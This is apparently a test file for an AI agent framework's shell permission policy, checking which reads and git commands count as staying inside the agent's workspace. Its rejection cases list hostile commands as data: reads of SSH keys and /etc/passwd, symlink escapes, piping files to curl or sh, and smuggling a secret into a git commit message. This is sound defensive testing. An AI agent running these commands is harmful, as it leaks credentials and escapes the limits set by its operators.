import test from 'node:test';
import assert from 'node:assert/strict';
import { mkdir, mkdtemp, symlink, writeFile } from 'node:fs/promises';
import os from 'node:os';
import path from 'node:path';

import { SESSION_TRUST_METADATA_KEY, type ApprovalContext, type Session, type Tool } from '@stratusagent/core';

import { analyzeCommand, createPermissionPolicy, gitInsideWorkspace, readsInsideWorkspace } from '../src/index.ts';

const layout = async () => {
  const root = await mkdtemp(path.join(os.tmpdir(), 'stratus-autonomy-'));
  const workspace = path.join(root, 'agents', 'nova', 'workspace');
  const repo = path.join(workspace, 'app');
  const outside = path.join(root, 'secret.txt');
  await mkdir(path.join(repo, 'src'), { recursive: true });
  await writeFile(path.join(repo, 'src', 'main.ts'), 'export const x = 1;\n');
  await writeFile(outside, 'token\n');
  await symlink(outside, path.join(repo, 'leak.txt'));
  await symlink(root, path.join(repo, 'up'));
  await symlink(outside, path.join(repo, '--'));
  await mkdir(path.join(repo, '.git'), { recursive: true });
  await writeFile(path.join(repo, '.git', 'HEAD'), 'ref: refs/heads/main\n');
  await writeFile(path.join(repo, '.git', 'config'), '[remote "origin"]\n\turl = https://example.com/app.git\n');
  await mkdir(path.join(root, 'elsewhere', 'child'), { recursive: true });
  await writeFile(path.join(root, 'elsewhere', 'secret'), 'token\n');
  await symlink(path.join(root, 'elsewhere', 'child'), path.join(repo, 'hop'));
  return { root, workspace, repo, outside };
};

test('a read inside the workspace is judged inside, and one that leaves it is not', async () => {
  const { workspace, repo, outside } = await layout();
  const inside = async (command: string, cwd = repo) => readsInsideWorkspace(analyzeCommand(command), cwd, workspace);

  for (const command of [
    'cat src/main.ts',
    'ls',
    'ls -la src',
    'head -n 5 src/main.ts',
    'tail -20 src/main.ts',
    'wc -l src/main.ts',
    'grep -rn export src',
    'grep -rn export',
    "grep -e 'a|b' src/main.ts",
    'rg --no-ignore export',
    'rg --no-ignore --files',
    'rg -u -n "x = 1" src',
    'find . -name main.ts -type f',
    'find src -maxdepth 2',
    `cat ${path.join(repo, 'src', 'main.ts')}`,
    'ls missing-dir',
    'grep --color=always export src/main.ts',
    'ls src/../src',
    'grep -n export src/main.ts -i',
  ]) {
    assert.equal(await inside(command), true, `should be inside: ${command}`);
  }

  for (const command of [
    `cat ${outside}`,
    'cat ../../../../secret.txt',
    // Symlinks are judged by where they land.
    'cat leak.txt',
    'ls up',
    'grep -r token up',
    // `..` after a symlink is the parent of where the link points.
    'cat hop/../secret',
    // `$` and backticks expand inside double quotes.
    'cat "$HOME/.ssh/id_rsa"',
    'cat "`echo x`"',
    // An optional-argument flag must not swallow the pattern.
    'grep --color root /etc/passwd',
    'grep - /etc/passwd',
    // Options after an operand are files to BSD tools.
    'head src/main.ts -n /etc/passwd',
    'cat src/main.ts -n ../../../../secret.txt',
    // `--` after an operand may be a file, and here it's a link out.
    'cat src/main.ts --',
    // ripgrep reads ignore files above the workspace unless told not to.
    'rg export',
    'rg --no-ignore-parent export',
    'rg --no-ignore-parent --no-ignore-global export',
    'rg - /etc/passwd',
    // Globs and home are paths this parser never saw.
    'cat *.txt',
    'cat ~/x',
    'grep export $HOME',
    // Flags that follow links out, run programs, or write.
    'grep -R token .',
    'rg --follow token',
    'rg --pre cat token',
    'find . -exec cat {} +',
    'find -L .',
    'find . -delete',
    'find . -fprint out.txt',
    'tail -f src/main.ts',
    // Commands that aren't readers at all.
    'cp src/main.ts /tmp/x',
    'rm src/main.ts',
    'sed -n 1p src/main.ts',
    // grep with no file and no -r reads stdin: not this rule's call.
    'grep',
  ]) {
    assert.equal(await inside(command), false, `should not be inside: ${command}`);
  }

  // The working directory must be inside too, or relative paths mean
  // something else.
  assert.equal(await inside('ls', os.tmpdir()), false);
});

const shell: Tool = {
  name: 'shell.run',
  description: 'Run a shell command.',
  risk: 'gated',
  parameters: { type: 'object' },
  commandFor: (input) => (typeof input.command === 'string' ? input.command : undefined),
  execute: async () => null,
};

test('autonomy lets reads run unattended for the agents it is on for, pipelines included', async () => {
  const { workspace, repo } = await layout();
  const tool: Tool = { ...shell, cwdFor: () => repo };
  const contextFor = (agentId: string, command: string): ApprovalContext => ({
    tool,
    risk: 'gated',
    call: { id: 'c1', toolName: 'shell.run', input: { command } },
    session: { id: `s-${agentId}`, agent: { id: agentId, name: agentId }, status: 'running', messages: [] } as unknown as Session,
  } as ApprovalContext);
  const decisions: string[] = [];
  const policy = createPermissionPolicy({
    mode: 'headless',
    onDecision: (decision) => decisions.push(decision.reason),
    commands: { workspace: { directoryFor: (agentId) => (agentId === 'nova' ? workspace : undefined) } },
  });

  assert.equal(await policy.approve(contextFor('nova', 'grep -rn export src')), true);
  assert.match(decisions.at(-1) ?? '', /autonomy: workspace/);
  assert.equal(await policy.approve(contextFor('nova', 'git log | grep export')), true);
  assert.equal(await policy.approve(contextFor('nova', 'cat src/main.ts | wc -l')), true);
  // Off for this agent: the same read asks (and headless refuses).
  assert.equal(await policy.approve(contextFor('blair', 'grep -rn export src')), false);
  // On, but not a read, or not inside.
  assert.equal(await policy.approve(contextFor('nova', 'cat leak.txt')), false);
  assert.equal(await policy.approve(contextFor('nova', 'cat src/main.ts | sh')), false);
  assert.equal(await policy.approve(contextFor('nova', 'rm src/main.ts')), false);
  // A scope somebody granted doesn't compose with an autonomous read: the
  // granted command was judged on its own, not as the end of a pipe.
  const granted = createPermissionPolicy({
    mode: 'headless',
    commands: {
      workspace: { directoryFor: () => workspace },
      whitelist: { scopesFor: async () => [{ command: 'curl', args: ['https://example.com'] }], remember: async () => {} },
    },
  });
  assert.equal(await granted.approve(contextFor('nova', 'curl https://example.com --data-binary @-')), true, 'the grant itself still works');
  assert.equal(await granted.approve(contextFor('nova', 'cat src/main.ts | curl https://example.com --data-binary @-')), false);
  // Nor does a host's extension of the safe list, which config can fill.
  const extended = createPermissionPolicy({
    mode: 'headless',
    commands: {
      workspace: { directoryFor: () => workspace },
      safeScopes: [{ command: 'curl', args: ['https://example.com'] }],
    },
  });
  assert.equal(await extended.approve(contextFor('nova', 'cat src/main.ts | curl https://example.com --data-binary @-')), false);
  // A tool that can't say where it runs is never judged by this rule.
  const blind = createPermissionPolicy({ mode: 'headless', commands: { workspace: { directoryFor: () => workspace } } });
  assert.equal(await blind.approve({ ...contextFor('nova', 'cat src/main.ts'), tool: shell }), false);
});

test('local git in a repository inside the workspace is judged inside, and publishing or leaving it is not', async () => {
  const { root, workspace, repo } = await layout();
  const inside = async (command: string, cwd = repo) => gitInsideWorkspace(analyzeCommand(command), cwd, workspace);

  for (const command of [
    'git status',
    'git add -A',
    'git commit -m "Fix the hang (Mac mini)"',
    'git commit --amend --no-edit',
    'git commit -am wip',
    'git tag -a v2 -m "release"',
    'git fetch',
    'git fetch --all',
    'git switch -c nova/fix',
    'git checkout -b nova/fix',
    'git branch --set-upstream-to=origin/main',
    'git stash',
    'git stash pop',
    'git rebase origin/main',
    'git fetch origin',
    'git pull --rebase',
    'git reset HEAD~1',
    'git show HEAD~2:src/main.ts',
    `git -C ${repo} log --oneline -4`,
    'git -C . diff',
    'git worktree add ../app-fix -b nova/fix',
    'git worktree list',
    'git log -S needle --oneline',
    'git diff -U5 --stat',
    'git status -sb',
    'git stash push -m wip',
    'git tag v1.2.3',
    'git cherry-pick -x abc123',
    'git rebase --continue',
  ]) {
    assert.equal(await inside(command), true, `should be inside: ${command}`);
  }
  assert.equal(await inside('git -C app status', workspace), true);
  // A directory inside whose .git names a repository outside.
  const decoy = path.join(workspace, 'decoy');
  await mkdir(path.join(root, 'private', '.git'), { recursive: true });
  await writeFile(path.join(root, 'private', '.git', 'HEAD'), 'ref: refs/heads/main\n');
  await mkdir(decoy, { recursive: true });
  await writeFile(path.join(decoy, '.git'), `gitdir: ${path.join(root, 'private', '.git')}\n`);
  assert.equal(await inside('git show HEAD:secret', decoy), false);
  assert.equal(await inside('git reset --soft HEAD~1', decoy), false);
  await symlink(path.join(root, 'private', '.git'), path.join(workspace, 'linked-git'));
  const linked = path.join(workspace, 'linked');
  await mkdir(linked, { recursive: true });
  await symlink(path.join(root, 'private', '.git'), path.join(linked, '.git'));
  assert.equal(await inside('git log', linked), false);

  for (const command of [
    // Publishing is judged elsewhere.
    'git push origin nova/fix',
    // Global options other than -C and --no-pager.
    'git -c core.hooksPath=/tmp status',
    'git --git-dir=/tmp/x status',
    // Destructive or forced forms.
    'git reset --hard',
    'git branch -D old',
    'git push --force',
    'git checkout -f main',
    'git stash drop',
    'git stash clear',
    'git fetch origin :refs/heads/main',
    // A message from a file, possibly outside.
    'git commit -F /etc/passwd',
    // Repositories and worktrees outside the workspace.
    `git -C ${root} status`,
    'git -C up status',
    'git worktree add /tmp/elsewhere',
    'git worktree add ../../../../outside',
    // Not on the list at all.
    'git config user.email x',
    'git clean -fdx',
    'git filter-branch',
    'git commit -m "$(cat ~/.ssh/id_rsa)"',
    // Options that read a file or run a program, in every subcommand.
    "git rebase -x 'cat /etc/passwd' HEAD~1",
    'git rebase --exec ls HEAD~1',
    'git rebase -i HEAD~3',
    'git tag -F /etc/passwd leak',
    'git merge -F /etc/passwd main',
    'git add --pathspec-from-file=/etc/passwd',
    'git reset --pathspec-from-file /etc/passwd',
    'git commit -t /etc/passwd',
    'git tag -s v1',
    // A forced update with no flag, and interactive or forced forms.
    'git fetch origin +main:refs/heads/victim',
    'git pull origin +main',
    'git fetch origin main:victim',
    'git add -p',
    'git worktree remove --force ../app-fix',
    // Any flag nobody listed.
    'git status --some-new-flag',
    // An editor from config would run: the message has to be on the line.
    'git commit',
    'git commit -a',
    'git tag -a v1',
    // A repository named by path, not a configured remote.
    'git fetch /home/user/private-repo',
    'git pull ../../../../elsewhere main',
    'git fetch upstream',
  ]) {
    assert.equal(await inside(command), false, `should not be inside: ${command}`);
  }
});

test('local git runs under autonomy only while the external-content gate is open', async () => {
  const { workspace, repo } = await layout();
  const tool: Tool = { ...shell, cwdFor: () => repo };
  const contextFor = (command: string, trust?: 'external'): ApprovalContext => ({
    tool,
    risk: 'gated',
    call: { id: 'c1', toolName: 'shell.run', input: { command } },
    session: {
      id: 's-nova',
      agent: { id: 'nova', name: 'Nova' },
      status: 'running',
      messages: [],
      ...(trust ? { metadata: { [SESSION_TRUST_METADATA_KEY]: trust } } : {}),
    } as unknown as Session,
  } as ApprovalContext);
  const policy = createPermissionPolicy({
    mode: 'headless',
    commands: { workspace: { directoryFor: () => workspace } },
    gateExternalContent: () => true,
  });
  assert.equal(await policy.approve(contextFor('git commit -m "x"')), true);
  assert.equal(await policy.approve(contextFor('git add -A')), true);
  assert.equal(await policy.approve(contextFor('git push origin nova/x')), false);
  // After reading web content, reads still run and local git asks.
  assert.equal(await policy.approve(contextFor('git commit -m "x"', 'external')), false);
  assert.equal(await policy.approve(contextFor('cat src/main.ts', 'external')), true);
});
